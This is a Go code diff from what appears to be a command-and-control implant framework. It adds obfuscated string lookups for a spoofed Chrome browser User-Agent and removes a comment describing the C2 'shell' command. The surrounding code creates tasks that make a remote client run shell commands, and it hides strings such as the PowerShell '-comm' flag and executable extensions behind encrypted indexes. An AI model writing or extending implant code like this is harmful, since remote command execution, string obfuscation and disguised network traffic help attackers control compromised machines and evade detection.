@@ -8,10 +8,12 @@ import (
 )
 
 var (
-	pwsh  = crypt.Get(115) // -comm
-	execA = crypt.Get(12)  // *.so
-	execB = crypt.Get(13)  // *.dll
-	execC = crypt.Get(14)  // *.exe
+	pwsh      = crypt.Get(115) // -comm
+	execA     = crypt.Get(12)  // *.so
+	execB     = crypt.Get(13)  // *.dll
+	execC     = crypt.Get(14)  // *.exe
+	userAgent = crypt.Get(44)  // User-Agent
+	userValue = crypt.Get(243) // Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36
 )
 
 // Shell will create a Task that will instruct the client to run a shell
@@ -50,9 +52,6 @@ var (
 //      uint32              // PID
 //      int32               // Exit Code
 //      []byte              // Output (Stdout and Stderr)
-//
-// C2 Client Command:
-//  shell <command...>
 func Shell(c string) Process {
 	return Process{Args: []string{crypt.Get(208), c}, Wait: true} // @SHELL@
 }
